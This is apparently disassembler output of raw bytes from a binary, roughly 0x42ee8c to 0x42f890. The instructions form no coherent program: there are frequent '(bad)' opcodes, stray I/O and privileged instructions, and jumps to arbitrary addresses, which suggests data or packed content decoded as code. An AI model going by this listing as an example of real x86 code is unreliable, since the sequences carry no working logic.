  42ee8c:	in     eax,0xab
  42ee8e:	cmp    al,0x8
  42ee90:	mov    ds:0x30834ad7,al
  42ee95:	and    edx,DWORD PTR [esi]
  42ee97:	and    al,0xad
  42ee99:	cmp    bh,al
  42ee9b:	dec    ecx
  42ee9c:	scas   eax,DWORD PTR es:[edi]
  42ee9d:	frstor [ebp-0x30]
  42eea0:	push   edx
  42eea1:	pop    ebp
  42eea2:	dec    eax
  42eea3:	imul   edi,DWORD PTR [edx-0x1ecd0cf2],0x459aff9b
  42eead:	pop    ebx
  42eeae:	xchg   edx,esp
  42eeb0:	and    al,0xb6
  42eeb2:	or     ch,BYTE PTR [edx]
  42eeb4:	rol    BYTE PTR [edx+edi*4],cl
  42eeb7:	sbb    ch,al
  42eeb9:	stos   BYTE PTR es:[edi],al
  42eeba:	jbe    0x42ef1b
  42eebc:	adc    DWORD PTR [edi-0x25],ebp
  42eebf:	cdq    
  42eec0:	sti    
  42eec1:	and    dl,bl
  42eec3:	or     ebx,ebp
  42eec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eec7:	dec    ecx
  42eec8:	mov    ds:0x3ae3e1cd,eax
  42eecd:	mov    edx,0x5d88f891
  42eed2:	add    al,0x31
  42eed4:	push   ds
  42eed5:	mov    cl,0x98
  42eed7:	stos   BYTE PTR es:[edi],al
  42eed8:	mov    ah,0xed
  42eeda:	xchg   DWORD PTR [esp+eax*1-0x5bab4a20],ebx
  42eee1:	mov    bh,0xce
  42eee3:	ja     0x42ee84
  42eee5:	adc    eax,0xff1872ba
  42eeea:	retf   0x697c
  42eeed:	dec    ebx
	...
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	not    al
  42ef64:	pop    ecx
  42ef65:	test   WORD PTR [bx+di],0x0
  42ef6b:	add    DWORD PTR [eax],eax
  42ef6d:	add    BYTE PTR [ebx+0x4],ah
  42ef70:	mov    dh,0x88
  42ef72:	xchg   ebx,eax
  42ef73:	mov    BYTE PTR [esi],dl
  42ef75:	mul    ch
  42ef77:	stc    
  42ef78:	(bad)  
  42ef79:	mov    ds:0xa76baaa7,eax
  42ef7e:	mov    edx,0xdb0747c7
  42ef83:	xchg   esp,eax
  42ef84:	pop    eax
  42ef85:	mov    dh,0x2d
  42ef87:	mov    ecx,0xedabc0dc
  42ef8c:	lahf   
  42ef8d:	push   ebx
  42ef8e:	sbb    eax,0xfb0d20d4
  42ef93:	dec    edx
  42ef94:	(bad)  
  42ef95:	mov    ds:0x6872961a,al
  42ef9a:	call   0x80d8ab63
  42ef9f:	jb     0x42efd1
  42efa1:	iret   
  42efa2:	add    al,0xd0
  42efa4:	lock jns 0x42f016
  42efa7:	aam    0x13
  42efa9:	inc    edx
  42efaa:	daa    
  42efab:	stc    
  42efac:	mov    DWORD PTR [edx+0x31],eax
  42efaf:	dec    DWORD PTR [esi-0x31]
  42efb2:	mov    ebp,0x17c2efb6
  42efb7:	pop    ecx
  42efb8:	icebp  
  42efb9:	xor    ebx,DWORD PTR [ebp-0x5ce7df93]
  42efbf:	or     ch,ah
  42efc1:	pop    ecx
  42efc2:	loope  0x42ef94
  42efc4:	mov    cl,BYTE PTR [edi+eax*1]
  42efc7:	pop    edx
  42efc8:	pusha  
  42efc9:	or     DWORD PTR [ecx-0x5769c6a2],esp
  42efcf:	xor    ebx,esi
  42efd1:	mov    edx,0x9bdf92d3
  42efd6:	and    BYTE PTR [esi-0x4d91d2aa],0xce
  42efdd:	or     al,0x73
  42efdf:	mov    dh,0xc9
  42efe1:	sbb    ecx,DWORD PTR [esp+edi*4]
  42efe4:	scas   al,BYTE PTR es:[edi]
  42efe5:	xchg   esp,eax
  42efe6:	dec    edi
  42efe7:	inc    esi
  42efe8:	dec    esp
  42efe9:	add    ah,bh
  42efeb:	nop
  42efec:	fwait
  42efed:	icebp  
  42efee:	adc    DWORD PTR [ecx-0x18394941],0x54
  42eff5:	loopne 0x42efd3
  42eff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eff8:	adc    eax,0x9c277df2
  42effd:	pushf  
  42effe:	enter  0xd565,0xf2
  42f002:	inc    edi
  42f003:	jno    0x42f033
  42f005:	jo     0x42efa5
  42f007:	adc    eax,0x537e3fe9
  42f00c:	jge    0x42ef90
  42f00e:	mov    cl,0xc3
  42f010:	inc    BYTE PTR [ebx+0x78115930]
  42f016:	pop    eax
  42f017:	adc    eax,0x4aca7e2d
  42f01c:	(bad)  
  42f01d:	shl    ebx,cl
  42f01f:	lock jae 0x42f025
  42f022:	sub    al,0x7b
  42f024:	icebp  
  42f025:	push   0x6
  42f027:	imul   edi,DWORD PTR [edi],0x5f
  42f02a:	in     eax,0xcd
  42f02c:	arpl   WORD PTR [eax],ax
  42f02e:	push   edx
  42f02f:	mov    ch,0x63
  42f031:	arpl   WORD PTR [edi-0x24],bx
  42f034:	inc    DWORD PTR [eax+0x232a7ed2]
  42f03a:	nop
  42f03b:	sahf   
  42f03c:	adc    DWORD PTR [ebx],eax
  42f03e:	jmp    0x42f05d
  42f040:	xor    eax,DWORD PTR [ebp+0x43]
  42f043:	inc    ecx
  42f044:	and    al,0x15
  42f046:	(bad)  
  42f047:	aaa    
  42f048:	lock and ah,dh
  42f04b:	rcr    BYTE PTR [esi+0x2a],cl
  42f04e:	outs   dx,DWORD PTR ds:[esi]
  42f04f:	or     al,0x8f
  42f051:	and    bh,BYTE PTR ds:0x7c7ee92b
  42f057:	(bad)  
  42f058:	jns    0x42f096
  42f05a:	arpl   bp,di
  42f05c:	int    0x8
  42f05e:	pop    ebx
  42f05f:	dec    eax
  42f060:	addr16 daa 
  42f062:	out    0x8f,eax
  42f064:	push   ecx
  42f065:	clc    
  42f066:	or     al,0xaa
  42f068:	cld    
  42f069:	imul   ebx,DWORD PTR [edi],0x17fc62
	...
  42f0d3:	add    BYTE PTR [eax],al
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	jle    0x42f14d
  42f0e4:	repz (bad) 
  42f0e6:	addr16 clc 
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	es iret 
  42f0f0:	and    eax,0x5efc1a00
  42f0f5:	xrelease xchg BYTE PTR [ecx+0x5f],bl
  42f0f9:	gs sahf 
  42f0fb:	call   FWORD PTR [ebx+ecx*2-0x43]
  42f0ff:	mov    bh,0xd6
  42f101:	push   0xffffffca
  42f103:	xor    DWORD PTR [eax+edi*1-0x18d4da9],esi
  42f10a:	daa    
  42f10b:	jb     0x42f0e8
  42f10d:	(bad)  
  42f10e:	jmp    0x9eecb764
  42f113:	jmp    0x42f10e
  42f115:	sub    esp,edx
  42f117:	adc    eax,0x86d976e7
  42f11c:	les    edi,FWORD PTR ds:0x9851b708
  42f122:	mov    gs,WORD PTR [ebp+0x155574e4]
  42f128:	lds    ebx,FWORD PTR [edi]
  42f12a:	es popa 
  42f12c:	inc    edx
  42f12d:	or     eax,0xfbf2918a
  42f132:	pusha  
  42f133:	sub    DWORD PTR [edi],0xf5d3e556
  42f139:	lahf   
  42f13a:	pop    ebp
  42f13b:	inc    edx
  42f13c:	(bad)  
  42f13d:	in     al,dx
  42f13e:	inc    ecx
  42f13f:	pop    esi
  42f140:	(bad)  
  42f141:	iret   
  42f142:	out    dx,al
  42f143:	(bad)  
  42f144:	sar    ch,cl
  42f146:	inc    esp
  42f147:	jns    0x42f0f0
  42f149:	sub    eax,0x5a54060
  42f14e:	daa    
  42f14f:	cmp    BYTE PTR [esi],0x4
  42f152:	mov    esp,0x71d356a
  42f157:	and    BYTE PTR [edx+ecx*1-0xaae910e],bl
  42f15e:	sbb    dl,BYTE PTR [esi+0x6f]
  42f161:	adc    al,0xd2
  42f163:	imul   esp,DWORD PTR [ebx-0x79a85a21],0xd9d09ac4
  42f16d:	cmp    ch,0x3f
  42f170:	repnz mov DWORD PTR [edi+0x11],ebp
  42f174:	adc    al,0xfd
  42f176:	sbb    DWORD PTR [ebx-0x4beedb53],eax
  42f17c:	xchg   ebx,eax
  42f17d:	rcr    BYTE PTR [esi],1
  42f17f:	sub    bh,BYTE PTR [esi+0x45385e66]
  42f185:	fwait
  42f186:	mov    eax,0x5bd31d9b
  42f18b:	std    
  42f18c:	int3   
  42f18d:	stos   DWORD PTR es:[edi],eax
  42f18e:	arpl   si,si
  42f190:	pushf  
  42f191:	cdq    
  42f192:	add    eax,ebp
  42f194:	jnp    0x42f1eb
  42f196:	fdivr  QWORD PTR [edx+0x6336e694]
  42f19c:	pop    esi
  42f19d:	sbb    al,BYTE PTR [ebp+0x48142b14]
  42f1a3:	psraw  mm2,mm7
  42f1a6:	or     BYTE PTR [edx+0x25349c91],dh
  42f1ac:	(bad)  
  42f1ad:	xchg   esi,eax
  42f1ae:	(bad)  
  42f1af:	cmp    eax,0x4a62036d
  42f1b4:	mov    eax,0x303123da
  42f1b9:	inc    ecx
  42f1ba:	loope  0x42f1a8
  42f1bc:	fidivr DWORD PTR [esi+ecx*8]
  42f1bf:	and    ah,BYTE PTR [esi]
  42f1c1:	out    dx,eax
  42f1c2:	mov    ds:0x58efbe45,eax
  42f1c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1c8:	adc    edx,esp
  42f1ca:	inc    ebp
  42f1cb:	dec    edi
  42f1cc:	loope  0x42f21a
  42f1ce:	cmp    al,0xb2
  42f1d0:	add    eax,0x55f6b31f
  42f1d5:	scas   al,BYTE PTR es:[edi]
  42f1d6:	inc    edi
  42f1d7:	mov    ah,0xc7
  42f1d9:	ret    0x906a
  42f1dc:	dec    eax
  42f1dd:	or     eax,esp
  42f1df:	and    DWORD PTR [esp+esi*8+0x4b],esi
  42f1e3:	sub    bl,BYTE PTR [ebp+0x43]
  42f1e6:	data16 and dh,BYTE PTR [ecx+0x1]
  42f1ea:	(bad)  [edi]
  42f1ec:	pop    esp
  42f1ed:	rol    BYTE PTR [eax],1
	...
  42f253:	add    BYTE PTR [eax],al
  42f255:	add    BYTE PTR [edx+0x26],bl
  42f258:	jecxz  0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	jns    0x42f2b7
  42f264:	push   ebp
  42f265:	out    dx,eax
  42f266:	addr16 stc 
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	xchg   ebx,eax
  42f26f:	or     DWORD PTR [ebx-0x68],ebx
  42f272:	mov    cl,BYTE PTR ds:0x44f1c54c
  42f278:	imul   esp,DWORD PTR [ebx+0x32],0x4ab7002b
  42f27f:	jnp    0x42f2ad
  42f281:	xchg   esi,eax
  42f282:	adc    DWORD PTR [ecx],edi
  42f284:	jae    0x42f248
  42f286:	push   cs
  42f287:	(bad)  
  42f288:	or     BYTE PTR [edx+0x1e],cl
  42f28b:	retf   
  42f28c:	(bad)  
  42f28d:	fistp  WORD PTR [ebp-0x1eb76b2d]
  42f293:	sbb    esp,DWORD PTR [ebx+0x452eae9a]
  42f299:	inc    ebx
  42f29a:	aaa    
  42f29b:	fmul   DWORD PTR [ecx-0x57]
  42f29e:	mov    ebp,0xb1e7845c
  42f2a3:	xor    ebp,DWORD PTR ds:0x3e451320
  42f2a9:	stc    
  42f2aa:	pop    ds
  42f2ab:	out    dx,al
  42f2ac:	xchg   ecx,eax
  42f2ad:	adc    eax,0xdc0e7f4
  42f2b2:	test   DWORD PTR [ebx+0x5a],edi
  42f2b5:	lods   eax,DWORD PTR ds:[esi]
  42f2b6:	and    DWORD PTR [ecx],esp
  42f2b8:	jns    0x42f264
  42f2ba:	call   0x2f05d54e
  42f2bf:	dec    ebp
  42f2c0:	cmp    DWORD PTR [edx+0xf],eax
  42f2c3:	mov    ds:0x4c69ee13,al
  42f2c8:	adc    DWORD PTR [edi+eax*1-0x39],0xffffffe0
  42f2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2ce:	add    al,0x61
  42f2d0:	jbe    0x42f324
  42f2d2:	rcr    DWORD PTR [esi-0x1dab856b],cl
  42f2d8:	dec    ebx
  42f2d9:	dec    ecx
  42f2da:	sbb    dl,BYTE PTR [edi]
  42f2dc:	or     ebp,DWORD PTR [ebx]
  42f2de:	jecxz  0x42f27d
  42f2e0:	(bad)  
  42f2e1:	and    DWORD PTR [eax],ebx
  42f2e3:	rcl    BYTE PTR [edi-0x80],1
  42f2e6:	add    DWORD PTR [edi+0x29],0xffffff9e
  42f2ea:	imul   ebx,DWORD PTR [esi-0x3b],0xffffffd1
  42f2ee:	call   0xe3fd:0x21eeceab
  42f2f5:	inc    edx
  42f2f6:	test   al,0x95
  42f2f8:	lds    ebx,FWORD PTR [ecx]
  42f2fa:	push   esi
  42f2fb:	(bad)  
  42f2fc:	test   al,0x7f
  42f2fe:	jge    0x42f2dc
  42f300:	cmc    
  42f301:	mov    esp,0xc6098d39
  42f306:	pushf  
  42f307:	enter  0xfa7b,0x29
  42f30b:	inc    edx
  42f30c:	fs sub al,0x8d
  42f30f:	jnp    0x42f2e9
  42f311:	pop    edi
  42f312:	mov    bh,0x7
  42f314:	cdq    
  42f315:	gs mov ecx,0x5b717f8c
  42f31b:	inc    ebx
  42f31c:	stc    
  42f31d:	aad    0x56
  42f31f:	retf   
  42f320:	or     bl,al
  42f322:	or     bh,BYTE PTR [ebp-0x2dac3199]
  42f328:	jno    0x42f35f
  42f32a:	lock ja 0x42f2fc
  42f32d:	and    esp,DWORD PTR [ecx-0x76]
  42f330:	sbb    BYTE PTR [ebx+esi*2+0x72],ch
  42f334:	xor    eax,ebx
  42f336:	loop   0x42f305
  42f338:	fsub   QWORD PTR [ecx-0x49]
  42f33b:	sbb    al,0xef
  42f33d:	fwait
  42f33e:	(bad)  
  42f33f:	adc    ch,BYTE PTR [esp+eax*1+0x67]
  42f343:	add    DWORD PTR [eax],esp
  42f345:	repz or ebx,eax
  42f348:	xchg   esp,eax
  42f349:	dec    esp
  42f34a:	aas    
  42f34b:	xor    cl,cl
  42f34d:	stos   DWORD PTR es:[edi],eax
  42f34e:	sti    
  42f34f:	xor    esp,DWORD PTR [ecx-0x4220466e]
  42f355:	push   eax
  42f356:	mov    bl,0x1b
  42f358:	push   eax
  42f359:	mov    esi,esp
  42f35b:	cmp    eax,DWORD PTR [edx+0x53]
  42f35e:	sbb    eax,edx
  42f360:	dec    edi
  42f361:	mov    eax,0x727a598e
  42f366:	push   eax
  42f367:	in     eax,dx
  42f368:	adc    BYTE PTR [ebx-0x24f236f5],0x0
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	mov    edx,0x672c13a9
  42f3e7:	cli    
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	mov    bl,0x6a
  42f3f0:	or     eax,0x611cb21
  42f3f5:	out    dx,al
  42f3f6:	add    al,0xfa
  42f3f8:	jl     0x42f44e
  42f3fa:	inc    ebp
  42f3fb:	add    BYTE PTR [edi-0x680a3ee3],bh
  42f401:	mov    esi,ebp
  42f403:	xchg   ecx,eax
  42f404:	cmc    
  42f405:	and    BYTE PTR [ebx-0x6a824c62],ch
  42f40b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f40c:	rcr    BYTE PTR [ebx],0x8f
  42f40f:	(bad)  
  42f411:	mov    esi,0xdeb0011b
  42f416:	mov    edx,0xdfd17eae
  42f41b:	lock mov eax,0x73912552
  42f421:	mov    ds:0x5a2a0bf5,eax
  42f426:	push   esi
  42f427:	jno    0x42f444
  42f429:	loopne 0x42f3cf
  42f42b:	dec    edx
  42f42c:	push   ebp
  42f42d:	fisubr DWORD PTR [edx]
  42f42f:	gs jle 0x42f3cb
  42f432:	xor    DWORD PTR [ecx-0x6e],esp
  42f435:	or     ch,BYTE PTR [esi]
  42f437:	repz and BYTE PTR [ebx-0x1b],0x76
  42f43c:	sbb    eax,0xa1b5c1d0
  42f441:	lds    ebx,FWORD PTR [esp+eax*2+0x2b7b871e]
  42f448:	mov    edi,0x68a9784
  42f44d:	ds add eax,0x54e02f06
  42f453:	sub    al,0xe6
  42f455:	aas    
  42f456:	jns    0x42f4ce
  42f458:	jb     0x42f3f1
  42f45a:	sahf   
  42f45b:	dec    ebp
  42f45c:	int3   
  42f45d:	mov    dh,0x3
  42f45f:	fs sub al,0x1b
  42f462:	jbe    0x42f4a9
  42f464:	jg     0x42f3ee
  42f466:	out    0xc4,eax
  42f468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f46a:	fbstp  TBYTE PTR [ecx-0xfd4c411]
  42f470:	push   ebx
  42f471:	push   ss
  42f472:	or     DWORD PTR [eax+0x72],ebp
  42f475:	push   edi
  42f476:	das    
  42f477:	test   eax,0x508ad3e7
  42f47c:	nop
  42f47d:	push   ebx
  42f47e:	ins    DWORD PTR es:[edi],dx
  42f47f:	mov    eax,0x52f82b5b
  42f484:	rcr    BYTE PTR [esi],1
  42f486:	out    0xb3,ax
  42f489:	push   esp
  42f48a:	push   cs
  42f48b:	dec    edi
  42f48c:	rcl    BYTE PTR [edi+0x64e023b3],0x53
  42f493:	mov    ds:0xb8d99670,al
  42f498:	push   edx
  42f499:	mov    eax,ds:0xb2ea19aa
  42f49e:	nop
  42f49f:	(bad)  
  42f4a1:	adc    eax,0xbfdc03e1
  42f4a6:	jle    0x42f461
  42f4a8:	push   ss
  42f4a9:	sub    ecx,DWORD PTR [eax+0x1b]
  42f4ac:	(bad)
  42f4b0:	inc    esi
  42f4b1:	fild   WORD PTR [ebx]
  42f4b3:	icebp  
  42f4b4:	fsubr  DWORD PTR [edx-0x155a92f6]
  42f4ba:	pop    esp
  42f4bb:	jno    0x42f51a
  42f4bd:	sbb    ch,dl
  42f4bf:	add    eax,0xaac24eb0
  42f4c4:	inc    esi
  42f4c5:	pop    eax
  42f4c6:	or     eax,ebx
  42f4c8:	(bad)  
  42f4c9:	push   ebx
  42f4ca:	sbb    BYTE PTR [edx-0x34],ah
  42f4cd:	icebp  
  42f4ce:	out    dx,al
  42f4cf:	fistp  DWORD PTR [eax]
  42f4d1:	mov    ch,0x68
  42f4d3:	xor    esp,DWORD PTR [ebp+0x60]
  42f4d6:	sbb    dh,ah
  42f4d8:	lock dec esi
  42f4da:	or     al,0x21
  42f4dc:	loop   0x42f48b
  42f4de:	out    dx,eax
  42f4df:	and    BYTE PTR [edi-0x59],0xfb
  42f4e3:	add    eax,0xb75d813f
  42f4e8:	jnp    0x42f55d
  42f4ea:	dec    esi
  42f4eb:	push   esi
  42f4ec:	inc    edi
  42f4ed:	or     al,BYTE PTR [eax]
	...
  42f553:	add    BYTE PTR [eax],al
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	ret    
  42f563:	inc    edi
  42f564:	adc    eax,0x1fb67a4
  42f569:	add    BYTE PTR [eax],al
  42f56b:	add    DWORD PTR [eax],eax
  42f56d:	add    dh,ch
  42f56f:	add    eax,0x16be65bb
  42f574:	sti    
  42f575:	pop    ebp
  42f576:	inc    eax
  42f577:	mov    esp,0x21b8601b
  42f57c:	into   
  42f57d:	jmp    0x42f58a
  42f57f:	leave  
  42f580:	add    dl,BYTE PTR [ebx+ebp*4]
  42f583:	lods   eax,DWORD PTR ds:[esi]
  42f584:	ins    BYTE PTR es:[edi],dx
  42f585:	cmp    dl,dh
  42f587:	mov    dl,0x91
  42f589:	dec    esp
  42f58a:	les    ebp,FWORD PTR [ecx-0x6da6755a]
  42f590:	mov    eax,ebx
  42f592:	je     0x42f527
  42f594:	mov    DWORD PTR [ebx-0x3ba25b31],edx
  42f59a:	fild   WORD PTR [ecx]
  42f59c:	inc    ecx
  42f59d:	aaa    
  42f59e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42f5a0:	ror    DWORD PTR [ebx-0x2b],0x47
  42f5a4:	push   ecx
  42f5a5:	dec    esp
  42f5a6:	dec    eax
  42f5a7:	(bad)  
  42f5a8:	ror    BYTE PTR [ebx-0x314d4f15],cl
  42f5ae:	mov    al,ds:0x5c29c4a
  42f5b3:	in     eax,0xd
  42f5b5:	sub    BYTE PTR [ecx-0x1cc63e9a],ch
  42f5bb:	mov    ebx,DWORD PTR [ecx-0x19]
  42f5be:	xchg   esi,eax
  42f5bf:	out    0x98,al
  42f5c1:	inc    edx
  42f5c2:	lods   al,BYTE PTR ds:[esi]
  42f5c3:	test   esp,0x4dbb1954
  42f5c9:	fcmovnu st,st(1)
  42f5cb:	sar    bl,cl
  42f5cd:	sar    DWORD PTR [ecx],0x92
  42f5d0:	xchg   esi,eax
  42f5d1:	mov    bl,0xa4
  42f5d3:	mov    ah,0x8
  42f5d5:	dec    esi
  42f5d6:	mov    ebp,0x42ee97c9
  42f5db:	rcl    DWORD PTR [ebx],1
  42f5dd:	cli    
  42f5de:	push   0x42
  42f5e0:	mov    ds:0xbca183f5,eax
  42f5e5:	sbb    ah,al
  42f5e7:	test   al,0xd0
  42f5e9:	dec    ebx
  42f5ea:	ficom  DWORD PTR [ecx]
  42f5ec:	in     al,dx
  42f5ed:	aad    0xe5
  42f5ef:	les    ebx,FWORD PTR [ebp+0x7f]
  42f5f2:	inc    eax
  42f5f3:	push   ds
  42f5f4:	mov    esp,0xa067733
  42f5f9:	push   ebp
  42f5fa:	shl    DWORD PTR [ebp+0x147c900e],1
  42f600:	xchg   ebp,eax
  42f601:	daa    
  42f602:	xlat   BYTE PTR ds:[ebx]
  42f603:	imul   esp,ebx,0x49
  42f606:	into   
  42f607:	rcr    ecx,0x71
  42f60a:	rcpps  xmm3,XMMWORD PTR es:[edx+0x3a6e30ce]
  42f612:	fwait
  42f613:	push   DWORD PTR [edi+eax*8]
  42f616:	jmp    0x42f694
  42f618:	fidiv  DWORD PTR [esi]
  42f61a:	mov    eax,ds:0x8391f75c
  42f61f:	push   esp
  42f620:	ja     0x42f603
  42f622:	(bad)
  42f626:	sbb    dl,BYTE PTR [edi-0x32]
  42f629:	sar    BYTE PTR [eax+0x5d],1
  42f62c:	push   eax
  42f62d:	fistp  WORD PTR [edx+0x7743f360]
  42f633:	push   ebx
  42f634:	aas    
  42f635:	(bad)  
  42f636:	and    eax,0x56019c73
  42f63b:	cmp    DWORD PTR [edx],0x47
  42f63e:	in     al,dx
  42f63f:	adc    eax,0xfc0604af
  42f644:	in     eax,dx
  42f645:	adc    eax,0x43aaf9de
  42f64a:	add    al,0x6e
  42f64c:	jno    0x42f648
  42f64e:	in     eax,dx
  42f64f:	add    BYTE PTR [eax+0x41],cl
  42f652:	or     al,0x93
  42f654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f655:	sbb    al,0x30
  42f657:	sbb    bh,BYTE PTR ds:0x7533205f
  42f65d:	xchg   ebx,eax
  42f65e:	cli    
  42f65f:	rol    ebp,1
  42f661:	add    BYTE PTR [ebp+0x36f55b85],ah
  42f667:	or     eax,0x1fe9832f
  42f66c:	in     al,0x28
	...
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	jecxz  0x42f71f
  42f6e4:	cs ja  0x42f74e
  42f6e7:	cld    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	pop    ebx
  42f6ef:	popf   
  42f6f0:	jp     0x42f6c6
  42f6f2:	dec    ebp
  42f6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6f4:	inc    ecx
  42f6f5:	in     eax,dx
  42f6f6:	pop    edi
  42f6f7:	jl     0x42f6d9
  42f6f9:	inc    ebx
  42f6fa:	(bad)  
  42f6fb:	and    si,bx
  42f6fe:	lock hlt 
  42f700:	out    dx,al
  42f701:	sti    
  42f702:	imul   BYTE PTR [edx]
  42f704:	ins    BYTE PTR es:[edi],dx
  42f705:	adc    bh,BYTE PTR es:[esi+0x9bd4307]
  42f70c:	push   ecx
  42f70d:	aam    0x6c
  42f70f:	jge    0x42f6f2
  42f711:	enter  0x3ffa,0x57
  42f715:	test   eax,0x6f3088c9
  42f71a:	inc    esp
  42f71b:	add    BYTE PTR [ecx],cl
  42f71d:	and    BYTE PTR [ebp-0x7b],cl
  42f720:	jecxz  0x42f726
  42f722:	outs   dx,DWORD PTR ds:[esi]
  42f723:	sbb    eax,0x2cfe7160
  42f728:	idiv   BYTE PTR [edx]
  42f72a:	(bad)  
  42f72b:	sbb    BYTE PTR [ebx],0xb9
  42f72e:	mov    eax,0xdf696d35
  42f733:	jbe    0x42f73f
  42f735:	(bad)  
  42f737:	data16 jns 0x42f772
  42f73a:	bound  esp,QWORD PTR [edi+0x8717442]
  42f740:	shr    DWORD PTR [eax-0x10cbd282],cl
  42f746:	in     eax,0x1c
  42f748:	xchg   esp,eax
  42f749:	push   ss
  42f74a:	inc    eax
  42f74b:	icebp  
  42f74c:	bound  ebx,QWORD PTR [eax-0x509ff46f]
  42f752:	shr    DWORD PTR [edx],0xbc
  42f755:	mov    esi,0x3b05d08
  42f75a:	dec    edx
  42f75b:	jnp    0x42f6e9
  42f75d:	mov    ebp,0xe2f5967f
  42f762:	push   eax
  42f763:	xchg   ecx,eax
  42f764:	mov    fs,WORD PTR [ebx-0x6b3a498d]
  42f76a:	or     cl,ah
  42f76c:	scas   eax,DWORD PTR es:[edi]
  42f76d:	into   
  42f76e:	lahf   
  42f76f:	xor    ch,bl
  42f771:	mov    bl,0xfd
  42f773:	ret    0x9c50
  42f776:	push   ss
  42f777:	pop    esi
  42f778:	push   0xfffffff8
  42f77a:	xchg   ebp,eax
  42f77b:	mov    BYTE PTR ds:0xbeebc35a,bl
  42f781:	fld    DWORD PTR [edi-0x7b]
  42f784:	add    DWORD PTR [edi-0x5c],edi
  42f787:	inc    esi
  42f788:	dec    ebp
  42f789:	hlt    
  42f78a:	popf   
  42f78b:	cld    
  42f78c:	mov    esi,0xb0a34cbc
  42f791:	jle    0x42f71a
  42f793:	sub    eax,0xa2eed923
  42f798:	mov    WORD PTR [ebp-0x7b94aa49],es
  42f79e:	add    dh,BYTE PTR [ecx]
  42f7a0:	add    cl,BYTE PTR [ebx-0x59289ac4]
  42f7a6:	clc    
  42f7a7:	or     BYTE PTR ds:0x56f66a29,bh
  42f7ad:	dec    eax
  42f7ae:	pcmpeqw mm3,QWORD PTR [edi-0x3]
  42f7b2:	clc    
  42f7b3:	xchg   esi,eax
  42f7b4:	or     eax,0xfea6f119
  42f7b9:	xchg   edi,eax
  42f7ba:	(bad)  
  42f7bb:	aas    
  42f7bc:	inc    esp
  42f7bd:	stc    
  42f7be:	(bad)  
  42f7bf:	push   0xffffffbd
  42f7c1:	call   0xc3e5c16a
  42f7c6:	and    DWORD PTR [edx-0x80],ebp
  42f7c9:	pop    eax
  42f7ca:	scas   al,BYTE PTR es:[edi]
  42f7cb:	cld    
  42f7cc:	sbb    ah,BYTE PTR [ecx-0x23]
  42f7cf:	in     al,0xa1
  42f7d1:	and    eax,0x32577803
  42f7d6:	push   eax
  42f7d7:	pop    ebx
  42f7d8:	das    
  42f7d9:	(bad)  
  42f7db:	scas   eax,DWORD PTR es:[edi]
  42f7dc:	inc    ecx
  42f7dd:	idiv   BYTE PTR [edx+0x3a4fbc85]
  42f7e3:	push   DWORD PTR [esi-0x2cab30c4]
  42f7e9:	sub    BYTE PTR [edi-0x3],ch
  42f7ec:	idiv   dl
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xa4cfdc55
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	xchg   ebp,eax
  42f86f:	cli    
  42f870:	xchg   ebp,eax
  42f871:	outs   dx,BYTE PTR ds:[esi]
  42f872:	cs pop ecx
  42f874:	xor    esp,esp
  42f876:	dec    edi
  42f877:	push   ebp
  42f878:	mov    ebp,DWORD PTR [edi]
  42f87a:	dec    edi
  42f87b:	clc    
  42f87c:	retf   
  42f87d:	dec    ebp
  42f87e:	dec    ebx
  42f87f:	(bad)  
  42f880:	dec    edi
  42f881:	and    DWORD PTR [edx],esp
  42f883:	lods   al,BYTE PTR ds:[esi]
  42f884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f885:	neg    bl
  42f887:	in     eax,dx
  42f888:	mov    edx,DWORD PTR [edi-0x77ee6b34]
  42f88e:	add    al,0x2a
  42f890:	retf   
